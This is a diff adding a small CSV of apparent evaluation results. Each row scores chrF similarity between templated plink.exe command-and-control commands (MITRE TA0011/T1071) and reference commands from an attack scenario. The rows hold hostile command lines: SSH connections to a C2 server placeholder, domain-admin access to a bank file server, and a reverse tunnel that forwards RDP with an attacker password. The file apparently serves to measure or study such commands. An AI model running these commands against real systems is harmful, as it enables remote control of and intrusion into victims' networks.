@@ -1,0 +1,5 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_plink_TA0011_T1071.txt,plink,plink.exe -ssh -P <c2_server_port> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,34.893,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,39.423,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -A -a -X -x -t -T -1 -2 -4 -6 -C -i <private_key_file> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,29.019,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -R <listen_port>:localhost:<remote_port> -ssh -P <c2_server_port> <c2_server_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",30.252,True
